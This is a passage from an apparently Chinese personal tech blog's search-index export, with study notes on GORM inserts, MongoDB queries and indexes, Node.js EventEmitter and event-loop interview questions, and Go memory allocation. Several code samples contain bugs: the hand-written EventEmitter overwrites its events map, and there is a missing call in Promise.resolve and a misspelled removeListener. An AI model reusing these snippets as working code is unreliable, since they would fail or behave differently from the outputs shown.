&quot;Age&quot;, &quot;CreateAt&quot;).Create(&amp;user)// INSERT INTO `users` (`name`, `age`, `create_at`) VALUES (&quot;Jinzhu&quot;, 18, &quot;2024-07-04 11:05:21.775&quot;) 创建记录并忽略传递给Omit的字段值 12db.Omit(&quot;Name&quot;, &quot;Age&quot;, &quot;CreateAt&quot;).Create(&amp;user)// INSERT INTO `users` (`birthday`, `updated_at`) VALUES (&quot;2024-01-01 00:00:00.000&quot;, &quot;2024-07-04 11:05:21.775&quot;) 批量插入要高效地插入大量记录, 请将切片传递给Create方法。GORM将生成一条SQL来插入所有数据, 以返回所有主键值, 并触发Hook方法, 当这些记录可以被分割成多个批次时, GORM会开启一个事务来处理它们。 12345678910var users = []User&#123; &#123;Name: &quot;jinzhu1&quot;&#125;, &#123;Name: &quot;jinzhu2&quot;&#125;, &#123;Name: &quot;jinzhu3&quot;&#125;,&#125;db.Create(&amp;users)for _, user := range users &#123; user.ID // 1,2,3&#125; 可以通过db.CreateInBatches方法来指定批量插入的批次大小 12345678var users []User&#123; &#123;Name: &quot;jinzhi1&quot;&#125;, ... &#123;Name&#125;: &quot;jinzhi1000&quot;,&#125;// 插入批次大小为100db.CreateInBatches(&amp;users, 100) 注意: 使用CreateBatchSize选项初始化GORM实例后, 此后进行创建&amp;关联操作时所有的INSERT行为都会遵循初始化的配置。 12345678910111213db, err := gorm.Open(sqlite.Open(&quot;gorm.db&quot;), &amp;gorm.Config&#123; CreateBatchSize: 1000,&#125;)if err != nil &#123;...&#125;db := db.Session(&amp;gorm.Session&#123;CreateBatchSize: 1000&#125;)users := [5000]User&#123;&#123;Name: &quot;jinzhu&quot;, Pets: []Pet&#123;pet1, pet2, pet3&#125;&#125;&#125;db.Create(&amp;users)// INSERT INTO users xxx (5 batches)// INSERT INTO pets xxx (15 batches) 创建钩子GORM允许用户通过实现这些接口BeforeSave、BeforeCreate、AfterSave、AfterCreate来自定义钩子。这些钩子方法会在创建一条记录时被调用; 12345678func (u *User) BeforeCreate (tx *gorm.DB) (err error) &#123; u.UUID = uuid.New() if u.Role == &quot;admin&quot; &#123; return errors.New(&quot;invalid code&quot;) &#125; return&#125; 如果想跳过Hooks方法, 可以使用SkipHooks会话模式, 例子如下: 123DB.Session(&amp;gorm.Session&#123;SkipHooks: true&#125;).Create(&amp;user)DB.Session(&amp;gorm.Session&#123;SkipHooks: true&#125;).Create(&amp;users)DB.Session(&amp;gorm.Session&#123;SkipHooks: true&#125;).CreateInBatches(&amp;user, 100) 根据 Map 创建GORM支持通过map[string]interface&#123;&#125;与[]map[string]interface&#123;&#125;&#123;&#125;来创建记录。 123456789db.Model(&amp;User&#123;&#125;).Create(map[string]interface&#123; &#123; &quot;Name&quot;: &quot;jinzhu&quot;, &quot;Age&quot;: 18 &#125;,&#125;)// batch insert from `[]map[string]interface&#123;&#125;&#123;&#125;`db.Model(&amp;User).Create([]map[string]interface&#123;&#125;&#123; &#123; &quot;Name&quot;: &quot;jinzhu_1&quot;, &quot;Age&quot;: 18 &#125;, &#123; &quot;Name&quot;: &quot;jinzhu_2&quot;, &quot;Age&quot;: 20 &#125;,&#125;) 注意: 当使用map来创建时, 钩子方法不会执行, 关联不会被保存且不会回写主键。","categories":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"}]},{"title":"MongoDB速记","slug":"MongoDB","date":"2024-06-11T14:37:56.000Z","updated":"2024-06-17T07:01:03.862Z","comments":true,"path":"8ead567e.html","link":"","permalink":"http://example.com/8ead567e.html","excerpt":"记录MongoDB相关命令","text":"记录MongoDB相关命令 MongoDB 排序升序 查询one集合中的数据并根据age字段进行升序排序 123456789// 查询one集合中的数据并根据age字段进行升序排序Martin&gt; db.one.find().sort(&#123;&quot;age&quot;: 1&#125;)[ &#123; _id: ObjectId(&#x27;666862463ebdc4e4a4cdcdf6&#x27;), name: &#x27;li&#x27; &#125;, &#123; _id: ObjectId(&#x27;666862763ebdc4e4a4cdcdf7&#x27;), name: &#x27;zeng&#x27;, age: 16 &#125;, &#123; _id: ObjectId(&#x27;6668627f3ebdc4e4a4cdcdf8&#x27;), name: &#x27;wang&#x27;, age: 20 &#125;, &#123; _id: ObjectId(&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;), name: &#x27;zhang&#x27;, age: 24 &#125;, &#123; _id: ObjectId(&#x27;666862943ebdc4e4a4cdcdfa&#x27;), name: &#x27;li&#x27;, age: 28 &#125;] 查询one集合中age大于20并根据age进行升序排序 123456// 查询one集合中age大于20并根据age进行升序排序Martin&gt; db.one.find(&#123;age: &#123;$gt: 20&#125;&#125;).sort(&#123;&quot;age&quot;: 1&#125;)[ &#123; _id: ObjectId(&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;), name: &#x27;zhang&#x27;, age: 24 &#125;, &#123; _id: ObjectId(&#x27;666862943ebdc4e4a4cdcdfa&#x27;), name: &#x27;li&#x27;, age: 28 &#125;] 降序 查询one集合中的数据并根据age字段进行降序排序 123456789// 查询one集合中的数据并根据age字段进行降序排序Martin&gt; db.one.find().sort(&#123;&quot;age&quot;: -1&#125;)[ &#123; _id: ObjectId(&#x27;666862943ebdc4e4a4cdcdfa&#x27;), name: &#x27;li&#x27;, age: 28 &#125;, &#123; _id: ObjectId(&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;), name: &#x27;zhang&#x27;, age: 24 &#125;, &#123; _id: ObjectId(&#x27;6668627f3ebdc4e4a4cdcdf8&#x27;), name: &#x27;wang&#x27;, age: 20 &#125;, &#123; _id: ObjectId(&#x27;666862763ebdc4e4a4cdcdf7&#x27;), name: &#x27;zeng&#x27;, age: 16 &#125;, &#123; _id: ObjectId(&#x27;666862463ebdc4e4a4cdcdf6&#x27;), name: &#x27;li&#x27; &#125;] 查询one集合中age大于20并根据age进行降序排序 123456// 查询one集合中age大于20并根据age进行降序排序Martin&gt; db.one.find(&#123;age: &#123;$gt: 20&#125;&#125;).sort(&#123;&quot;age&quot;: -1&#125;)[ &#123; _id: ObjectId(&#x27;666862943ebdc4e4a4cdcdfa&#x27;), name: &#x27;li&#x27;, age: 28 &#125;, &#123; _id: ObjectId(&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;), name: &#x27;zhang&#x27;, age: 24 &#125;] 求和求集合的文档总数 查询one集合中的文档总数 123// 查询one集合中的文档总数Martin&gt; db.one.countDocuments()5 查询one集合中age大于20的文档数量 123// 查询one集合中age大于20的文档数量Martin&gt; db.one.find(&#123;age: &#123;$gt: 20&#125;&#125;).count()2 某个字段求和 导入测试数据 123456789101112131415161718192021222324252627282930313233343536373839// 导入测试数据Martin&gt; db.three.insertMany([&#123;name: &quot;li&quot;, class: 1, score: 89&#125;, &#123;name: &quot;zhang&quot;, class: 1, score: 92&#125;, &#123;name: &quot;li&quot;, class: 2, score: 94&#125;, &#123;name: &quot;liu&quot;, class: 2, score: 88&#125;])&#123; acknowledged: true, insertedIds: &#123; &#x27;0&#x27;: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfb&#x27;), &#x27;1&#x27;: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfc&#x27;), &#x27;2&#x27;: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfd&#x27;), &#x27;3&#x27;: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfe&#x27;) &#125;&#125;// 查询three集合中所有数据Martin&gt; db.three.find()[ &#123; _id: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfb&#x27;), name: &#x27;li&#x27;, class: 1, score: 89 &#125;, &#123; _id: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfc&#x27;), name: &#x27;zhang&#x27;, class: 1, score: 92 &#125;, &#123; _id: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfd&#x27;), name: &#x27;li&#x27;, class: 2, score: 94 &#125;, &#123; _id: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfe&#x27;), name: &#x27;liu&#x27;, class: 2, score: 88 &#125;] 对不同class进行score求和12345Martin&gt; db.three.aggregate([&#123;&#x27;$group&#x27;: &#123;&#x27;_id&#x27;: &#x27;$class&#x27;, &#x27;sum_score&#x27;: &#123;&#x27;$sum&#x27;: &#x27;$score&#x27;&#125;&#125;&#125;])[ &#123; _id: 1, sum_score: 181 &#125;, &#123; _id: 2, sum_score: 182 &#125;] 平均aggregate()用法解释示例: db.collection_name.aggregate([{&#39;$group&#39;: {&#39;_id&#39;: &#39;$group_filed&#39;, &#39;avg_xxx&#39;: {&#39;$avg&#39;: &#39;$avg_filed&#39;}}}])$group: 分组;_id: 分组后的标识;$group_filed: 分组的字段;avg_xxx: 聚合之后的字段名;$avg: 表示求平均值, $sum表示求和, $max: 表示求最大值, $min: 表示求最小值;$avg_filed: 要聚合的字段; 求平均值 123456// 根据班级求各班的平均值Martin&gt; db.three.aggregate([&#123;&#x27;$group&#x27;: &#123;&#x27;_id&#x27;: &#x27;$class&#x27;, avg_score: &#123;&#x27;$avg&#x27;: &#x27;$score&#x27;&#125;&#125;&#125;])[ &#123; _id: 2, avg_score: 91 &#125;, &#123; _id: 1, avg_score: 90.5 &#125; ] 求分组最大值 123456// 求分组最大值Martin&gt; db.three.aggregate([&#123;&#x27;$group&#x27;: &#123;_id: &#x27;$class&#x27;, &#x27;max_score&#x27;: &#123;&#x27;$max&#x27;: &#x27;$score&#x27;&#125;&#125;&#125;])[ &#123; _id: 1, max_score: 92 &#125;, &#123; _id: 2, max_score: 94 &#125;] 求分组最小值 123456// 求分组最小值Martin&gt; db.three.aggregate([&#123;&#x27;$group&#x27;: &#123;_id: &#x27;$class&#x27;, &#x27;min_score&#x27;: &#123;&#x27;$min&#x27;: &#x27;$score&#x27;&#125;&#125;&#125;])[ &#123; _id: 1, min_score: 89 &#125;, &#123; _id: 2, min_score: 88 &#125; ] 索引 提高检索的速度 单键索引 添加测试数据 12345678910111213141516171819202122232425262728293031// 使用for循环添加数据Martin&gt; for (var i=1; i&lt;=10000; i++) db.four.insert(&#123;num: i, name: &#x27;a&#x27;&#125;)DeprecationWarning: Collection.insert() is deprecated. Use insertOne, insertMany, or bulkWrite.&#123; acknowledged: true, insertedIds: &#123; &#x27;0&#x27;: ObjectId(&#x27;666d8638f6e0bc9a3ecdf505&#x27;) &#125;&#125;Martin&gt; db.four.find()[ &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdf6&#x27;), num: 1, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdf7&#x27;), num: 2, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdf8&#x27;), num: 3, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdf9&#x27;), num: 4, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdfa&#x27;), num: 5, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdfb&#x27;), num: 6, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdfc&#x27;), num: 7, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdfd&#x27;), num: 8, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdfe&#x27;), num: 9, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdff&#x27;), num: 10, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce00&#x27;), num: 11, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce01&#x27;), num: 12, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce02&#x27;), num: 13, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce03&#x27;), num: 14, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce04&#x27;), num: 15, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce05&#x27;), num: 16, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce06&#x27;), num: 17, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce07&#x27;), num: 18, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce08&#x27;), num: 19, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce09&#x27;), num: 20, name: &#x27;a&#x27; &#125;]Type &quot;it&quot; for more 创建索引 123// 创建索引, 1为升序索引, -1为降序索引Martin&gt; db.four.createIndex(&#123;&quot;num&quot;: 1&#125;)num_1 查询索引 123456// 查询索引Martin&gt; db.four.getIndexes()[ &#123; v: 2, key: &#123; _id: 1 &#125;, name: &#x27;_id_&#x27; &#125;, &#123; v: 2, key: &#123; num: 1 &#125;, name: &#x27;num_1&#x27; &#125;] 删除索引 12345// 删除索引Martin&gt; db.four.dropIndex(&quot;num_1&quot;)&#123; nIndexesWas: 2, ok: 1 &#125;Martin&gt; db.four.getIndexes()[ &#123; v: 2, key: &#123; _id: 1 &#125;, name: &#x27;_id_&#x27; &#125; ] 组合索引12345678// 创建组合索引Martin&gt; db.four.createIndex(&#123;&quot;num&quot;: 1, &quot;name&quot;: 1&#125;)num_1_name_1Martin&gt; db.four.getIndexes()[ &#123; v: 2, key: &#123; _id: 1 &#125;, name: &#x27;_id_&#x27; &#125;, &#123; v: 2, key: &#123; num: 1, name: 1 &#125;, name: &#x27;num_1_name_1&#x27; &#125;] 多值索引（组合索引）123456789101112131415161718// 写入测试数据Martin&gt; db.five.insert(&#123;name: &quot;martin&quot;, tag: [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]&#125;)&#123; acknowledged: true, insertedIds: &#123; &#x27;0&#x27;: ObjectId(&#x27;666d8a8ef6e0bc9a3ecdf506&#x27;) &#125;&#125;// 创建多值索引Martin&gt; db.five.createIndex(&#123;tag: 1&#125;)tag_1// 查询数据Martin&gt; db.five.find(&#123;tag: &quot;b&quot;&#125;)[ &#123; _id: ObjectId(&#x27;666d8a8ef6e0bc9a3ecdf506&#x27;), name: &#x27;martin&#x27;, tag: [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; ] &#125;] 全文索引123456789101112131415161718// 创建全文索引（name字段）, 一个集合最多创建一个全文索引Martin&gt; db.five.createIndex(&#123;&quot;name&quot;: &quot;text&quot;&#125;)name_text// 获取索引Martin&gt; db.five.getIndexes()[ &#123; v: 2, key: &#123; _id: 1 &#125;, name: &#x27;_id_&#x27; &#125;, &#123; v: 2, key: &#123; tag: 1 &#125;, name: &#x27;tag_1&#x27; &#125;, &#123; v: 2, key: &#123; _fts: &#x27;text&#x27;, _ftsx: 1 &#125;, name: &#x27;name_text&#x27;, weights: &#123; name: 1 &#125;, default_language: &#x27;english&#x27;, language_override: &#x27;language&#x27;, textIndexVersion: 3 &#125;] 哈希索引123456789101112131415161718// 创建哈希索引, 哈希索引不支持范围索引并且不支持多键哈希Martin&gt; db.five.createIndex(&#123;name: &quot;hashed&quot;&#125;)name_hashedMartin&gt; db.five.getIndexes()[ &#123; v: 2, key: &#123; _id: 1 &#125;, name: &#x27;_id_&#x27; &#125;, &#123; v: 2, key: &#123; tag: 1 &#125;, name: &#x27;tag_1&#x27; &#125;, &#123; v: 2, key: &#123; _fts: &#x27;text&#x27;, _ftsx: 1 &#125;, name: &#x27;name_text&#x27;, weights: &#123; name: 1 &#125;, default_language: &#x27;english&#x27;, language_override: &#x27;language&#x27;, textIndexVersion: 3 &#125;, &#123; v: 2, key: &#123; name: &#x27;hashed&#x27; &#125;, name: &#x27;name_hashed&#x27; &#125;] 地理位置索引12345678910111213141516// 添加测试数据Martin&gt; db.six.insertMany([&#123;loc: [9, 9]&#125;, &#123;loc: [11, 11]&#125;, &#123;loc: [100, 100]&#125;])&#123; acknowledged: true, insertedIds: &#123; &#x27;0&#x27;: ObjectId(&#x27;666d8d75f6e0bc9a3ecdf507&#x27;), &#x27;1&#x27;: ObjectId(&#x27;666d8d75f6e0bc9a3ecdf508&#x27;), &#x27;2&#x27;: ObjectId(&#x27;666d8d75f6e0bc9a3ecdf509&#x27;) &#125;&#125;// 创建地理位置索引Martin&gt; db.six.createIndex(&#123;loc: &quot;2d&quot;&#125;)loc_2d// 查询在[10, 10]~[12, 12]之间的数据Martin&gt; db.six.find(&#123;loc: &#123;$geoWithin: &#123;$box: [[10, 10], [12, 12]]&#125;&#125;&#125;)[ &#123; _id: ObjectId(&#x27;666d8d75f6e0bc9a3ecdf508&#x27;), loc: [ 11, 11 ] &#125; ] MongoDB查询计划MongoDB慢查询 查看是否开启慢查询1234Martin&gt; db.getProfilingStatus()&#123; was: 0, slowms: 100, sampleRate: 1, ok: 1 &#125;// was: 表示级别 0 - 不开启 1 - 记录慢查询（默认&gt;100ms） 2 - 记录所有命令// slowms: 表示慢查询时间设定值 Go操作MongoDB 创建连接 1234567891011121314151617181920212223242526272829303132333435// MongoDB连接配置client, err := mongo.NewClient(options.Client().ApplyURI(&quot;xxx&quot;))// 错误判断if err != nil &#123; fmt.Errorf(&quot;client establish failed, err: %v&quot;, err)&#125;// 超时控制ctx, cancel := context.WithTimeout(context.Background(), 10 * time.Second)defer cancel()// 创建连接if err = client.Connect(ctx); err == nil &#123; fmt.Println(&quot;connect to db success&quot;)&#125;// 连接databasedb := client.Database(&quot;Martin&quot;)// 获取集合名collectionNames, err := db.ListCollectionNames(ctx, bson.M&#123;&#125;)if err != nil &#123; fmt.Errorf(&quot;err: %v&quot;, err)&#125;// 输出集合名fmt.Println(&quot;collectionNames: &quot;, collectionNames)// 断开连接defer func() &#123; if err = client.Disconnect(ctx); err != nil &#123; panic(err) &#125;&#125; 创建文档 12// 写入当行文档","categories":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://example.com/categories/MongoDB/"}],"tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://example.com/tags/MongoDB/"}]},{"title":"NodeJS八股文","slug":"NodeJS八股文","date":"2024-05-12T14:34:56.000Z","updated":"2024-05-13T15:42:53.750Z","comments":true,"path":"21f5d73e.html","link":"","permalink":"http://example.com/21f5d73e.html","excerpt":"记录NodeJS八股文","text":"记录NodeJS八股文 说说对Node.js的理解？优缺点？应用场景？理解 开源与跨平台的JavaScript运行时环境 在浏览器外运行V8 JavaScript引擎（Google Chrome的内核）, 利用事件驱动、非阻塞和异步输入输出模型等技术提高性能; 优点 处理高并发场景性能更佳; 适合I&#x2F;O密集型应用; 缺点 单线程, 不适合CPU密集型应用; 只支持单核CPU, 不能充分利用CPU; 可靠性低, 一旦代码某个环节崩溃, 整个系统都崩溃; 说说Node中的EventEmitter？如何实现一个EventEmitter？Node采用了事件驱动机制, 而EventEmitter就是实现事件驱动的基础; 在EventEmitter的基础上, Node几乎所有的模块都继承了这个类, 这些模块拥有了自己的事件, 可以绑定&#x2F;触发监听器, 实现了异步操作; 12345678910111213// 实现一个自定义eventconst EventEmitter = require(&#x27;events&#x27;);class MyEmitter extends EventEmitter&#123;&#125;const myEmitter = new MyEmitter();function callback() &#123; console.log(&#x27;触发了event事件&#x27;);&#125;myEmitter.on(&#x27;event&#x27;, callback);myEmitter.emit(&#x27;event&#x27;);myEmitter.removeListener(&#x27;event&#x27;, callback); EventLoop在浏览器与NodeJS的区别结论 NodeJS版本 &gt;= 11之后就和浏览器保持一致; NodeJS版本 &lt;= 10, 浏览器和NodeJS环境下, 在microtask(微任务)任务队列的执行时机不同, 有不同的效果; 看题1234567891011121314151617function test() &#123; setTimeout(() =&gt; &#123; console.log(&#x27;children2&#x27;); Promise.resolve().then(() =&gt; &#123; console.log(&#x27;children2-1&#x27;); &#125;) &#125;, 0) setTimeout(() =&gt; &#123; console.log(&#x27;children3&#x27;); Promise.resolve.then(() =&gt; &#123; console.log(&#x27;children3-1&#x27;); &#125;) &#125;)&#125;test(); 答案12345// node &gt;= 11 &amp;&amp; 浏览器children2 children2-1 children3 children3-1// node &lt;= 10children2 children3 children2-1 children3-1 解析 我们就记住浏览器的EventLoop的机制就可以, 如果问到在NodeJS环境下的执行是什么, 我们可以来解析一下 在NodeJS 版本 &gt;= 11 以及浏览器下 执行test函数; 执行第一个setTimeout, 放入到宏任务中; 执行第二个setTimeout, 放入到宏任务中; 此刻微任务里面没有任务, 那么执行宏任务, 从队列的头部取出一个宏任务(第一个setTimeout); 打印children2, 此刻遇见Promise的then, 是微任务, 放入到微任务队列里面; 接下来我们发现微任务里面有任务了, 取微任务里面的任务, 打印出children2-1; 此刻微任务里面没有任务, 那么继续执行宏任务, 从任务队列的头部取出一个宏任务(第二个setTimeout); 打印children3, 此刻遇见Promise的then, 是微任务, 放入微任务队列里面; 接下来我们发现微任务里面有任务了, 取微任务里面的任务, 打印children3-1; 在NodeJS版本 &lt;= 10下 执行test函数; 执行第一个setTimeout, 放入到宏任务里面; 执行第二个setTimeout, 放入到宏任务里面; 此刻微任务里面没有任务, 那么执行宏任务, 从队列的头部取出一个宏任务(第一个setTimeout); 打印children2, 此刻遇见Promise的then, 是微任务, 放入到微任务队列里面; 注意注意！！！此刻将会继续从队列的头部取出一个宏任务(第二个setTimeout); 打印children3, 此刻遇见Promise的then, 是微任务, 放入到微任务队列里面; 此刻微任务队列里有2个任务, 依次取出执行children2-1 children3-1; 大白话它们的主要区别是执行微任务的时机不同, 假如此刻宏任务有2个任务AB, 此刻微任务队列什么都没有。如果是NodeJS版本 &lt;= 10下, 在执行A任务的时候产生了微任务W, A任务执行完毕, 那么会继续执行B, B执行完成之后再去执行微任务。而NodeJS版本 &gt;= 11 &amp;&amp; 浏览器执行A任务, 产生了微任务, A执行完之后要去执行微任务。 简述什么是EventEmitter？EventEmitter是Node.js中的一个核心模块, 主要用于处理事件相关的操作。它是事件驱动编程模式的一个实现, 提供了一种机制, 允许对象（也被事件发射器）发布（emit）事件, 而其他对象（也被称为监听器）可以订阅这些事件并定义当这些事件发生时应该执行的回调函数; EventEmitter的主要功能包括事件的注册和监听、事件触发与传递参数, 以及事件的移除。通过调用EventEmitter的on或addListener方法, 可以将事件监听器绑定到特定的事件上。当使用EventEmitter的emit方法触发特定的事件时, 所有注册到该事件的监听器将会按照注册的顺序被调用, 并且可以传递参数给事件监听器。此外, 通过调用removeListener方法, 可以在不需要时移除特定事件的监听器; EventEmitter是一种发布-订阅模式的实现, 也是一种观察者模式的实现。它充当了事件调度中心的角色, 是Node.js中实现异步操作的关键组件之一。 如何实现一个EventEmitter？什么是EventEmitter？在Node.js中, EventEmitter是事件驱动的基础, 几乎所有模块都继承自它。它实现了观察者模式, 其中被观察者维护一组观察者, 并在更新时通知观察者; EventEmitter允许对象绑定和触发事件监听器, 实现异步操作。在Node.js中, 许多对象都会分发事件, 例如fs.readStream对象会在文件被打开时触发一个事件; 使用EventEmitterNode.js的events模块提供了一个EventEmitter类, 可以通过继承它创建自定义事件对象。 基本使用方法如下： 12345678910111213const EventEmitter = require(&#x27;events&#x27;);class MyEmitter extends EventEmitter&#123;&#125;;const myEmitter = new MyEmitter();function callback() &#123; console.log(&#x27;触发了event事件&#x27;);&#125;myEmitter.on(&#x27;event&#x27;, callback);myEmitter.emit(&#x27;event&#x27;);myEmitter.removeListener(&#x27;event&#x27;, callback); EventEmitter的常用方法有： on(eventName, listener)：添加类型为eventName的事件监听器; once(eventName, listener)：添加类型为eventName的事件监听器, 但只能执行一次, 执行后将被删除; prependListener(eventName, listener)：添加类型为eventName的事件监听器到事件数组头部; emit(eventName, ...args)：触发类型为eventName的事件监听器; removeListener(eventName, listener)：移除类型为eventName的事件监听器; 实现自定义EventEmitter我们可以简单实现一个EventEmitter类, 了解其基本原理。在实现过程中, 需要维护一个包含所有事件的对象events。 12345678910111213141516171819202122232425262728class EventEmitter &#123; constructor() &#123; this.events = &#123;&#125;; &#125; on(type, handler) &#123; if (!this.events[type]) &#123; this.events = []; &#125; this.events[type].push(handler); &#125; emit(type, ...args) &#123; if (!this.events[type]) &#123; return; &#125; this.events[type].forEach((handler) =&gt; &#123; handler.apply(this, args); &#125;) &#125; removeListener(type, handler) &#123; if (!this.events[type]) &#123; return; &#125; this.events[type] = this.events[type].filter((item) =&gt; item != handler); &#125;&#125; 测试自定义EventEmitter123456789101112131415161718192021const bus = new EventEmitter();bus.on(&#x27;event&#x27;, () =&gt; &#123; console.log(&#x27;Event 1&#x27;)&#125;)function event2() &#123; console.log(&#x27;Event 2&#x27;);&#125;bus.on(&#x27;event&#x27;, event2);bus.emit(&#x27;event&#x27;);// Output:// Event 1// Event 2bus.removeLister(&#x27;event&#x27;, event2);bus.emit(&#x27;event&#x27;);// Output:// Event 1 总结EventEmitter是Node.js中非常重要的一个模块, 它实现了事件驱动的基本模式, 让Node.js具备了处理异步操作的能力。","categories":[{"name":"NodeJS","slug":"NodeJS","permalink":"http://example.com/categories/NodeJS/"}],"tags":[{"name":"NodeJS","slug":"NodeJS","permalink":"http://example.com/tags/NodeJS/"}]},{"title":"Golang垃圾回收","slug":"Golang垃圾回收","date":"2024-04-18T04:25:25.000Z","updated":"2024-05-16T11:18:50.316Z","comments":true,"path":"d19ea524.html","link":"","permalink":"http://example.com/d19ea524.html","excerpt":"现代高级编程语言管理内存的方式分自动和手动两种; 手动管理内存的典型代表是C&#x2F;C++, 编写代码过程中需要主动申请或者释放内存; 而PHP、Java和Go等语言使用自动的内存管理系统, 由内存分配器和垃圾收集器来代为分配和回收内存, 其中垃圾收集器就是GC 从Go v1.12版本开始, Go使用了非分代的、并发的、基于三色标记清除的垃圾回收器; Go是一种静态类型的编译型语言; 因此, Go不需要VM, Go应用程序二进制文件中嵌入了一个小型运行时(Go runtime), 可以处理垃圾收集(GC)、调度和并发之类的语言功能","text":"现代高级编程语言管理内存的方式分自动和手动两种; 手动管理内存的典型代表是C&#x2F;C++, 编写代码过程中需要主动申请或者释放内存; 而PHP、Java和Go等语言使用自动的内存管理系统, 由内存分配器和垃圾收集器来代为分配和回收内存, 其中垃圾收集器就是GC 从Go v1.12版本开始, Go使用了非分代的、并发的、基于三色标记清除的垃圾回收器; Go是一种静态类型的编译型语言; 因此, Go不需要VM, Go应用程序二进制文件中嵌入了一个小型运行时(Go runtime), 可以处理垃圾收集(GC)、调度和并发之类的语言功能 Golang内存管理Golang运行调度三个基本概念: G、M、P; G: Goroutine执行的上下文环境; M: 操作系统进程; P: Processer; 调度器的关键, 调度器, 也可以认为约等于CPU; Go内存管理 TCMallocGo将内存划分和分组为页(Page), 这和Java的内存结构完全不同, 没有分代内存, 这样的原因是Go的内存分配器采用了TCMalloc的设计思想: Page与TCMalloc中的Page相同, x64下1个Page的大小是8KB; 上图的最下方, 1个浅蓝色长方形代表1个Page; Span与TCMalloc中的Span相同, Span是内存管理的基本单位; 代码中为mspan, 一组连续的Page组成1个Span, 所以上图一组连续的浅蓝色长方形代表的是一组Page组成的1个Span, 另外1个淡紫色长方形为1个Span; mcachemcache是提供给P(逻辑处理器)的高速缓存, 用于存储小对象(对象大小&lt;&#x3D;32Kb); 尽管这类似于线程堆栈, 但它是堆的一部分, 用于动态数据; 所有类大小的mcache包含scan和noscan类型的mspan。Goroutine可以从mcache没有任何锁的情况下获取内存, 因为一次P只能有一个锁G。因此, 这更有效。mcache从mcentral需要时请求新的span; mcentralmcentral与TCMalloc中的CentralCache类似, 是所有线程共享的缓存, 需要加锁访问, 它按Span class对Span分类, 串联成链表, 当mcache的某个级别的内存被分配光时, 它会像mcentral申请1个当前级别的Span。每个mcentral包含两个mspanList: empty: 双向span链表, 包括没有空闲对象的span或缓存mcache中的span。当此处的span被释放时, 它将被移至non-empty span链表; non-empty: 有空闲对象的span双向链表。当从mcentral请求新的span, mcentral将从该链表中获取span并将其移入empty span链表; mheapmheap与TCMalloc中的PageHeap类似, 它是堆内存的抽象, 也是垃圾回收的重点区域, 把从OS申请出的内存页组织成Span, 并保存起来。当mcentral的Span不够用时会向mheap申请, mheap的Span不够用时会向OS申请, 向OS的内存申请是按页来的, 然后把申请来的内存页生成Span组织起来, 同样也是需要加锁访问的; 栈这是栈存储区, 每个Goroutine(G)有一个栈。在这里存储了静态数据, 包括函数栈帧, 静态结构, 原生类型值和指向动态结构的指针。这与分配给每个P的mcache不是一回事; 内存分配Go中的内存分类并不像TCMalloc分成小、中、大对象, 但是它的小对象里又细分了一个Tiny对象, Tiny对象指大小在1Byte到16Byte之间并且不包含指针的对象。小对象和大对象只用大小划定, 无其他区分; 核心思想: 把内存分为多级管理, 降低锁的粒度(只是去mcentral和mheap会申请锁), 以及多种对象大小类型, 减少分配产生的内存碎片; 微小对象(Tiny)（size &lt; 16B）使用mcache的微小分配器分配小于16个字节的对象, 并且在单个16字节块上可完成多个微小分配; 小对象（size 16B ~ 32KB）大小在16个字节和32k字节之间的对象被分配在G运行所在的P的mcache对应的mspan size class上; 大对象（size &gt; 32KB）大于32 KB的对象直接分配在mheap的相应大小类上(span class); 如果mheap为空或没有足够大的页面满足分配请求, 则它将从操作系统中分配一组新的页(至少1MB); 如果对应的大下规格在mcache中没有可用的块, 则向mcentral申请; 如果mcentral中没有可用的块, 则向mheap中申请, 并根据BestFit算法找到最合适的mspan。如果申请到的mspan超出申请大小, 将会根据需求进行切分, 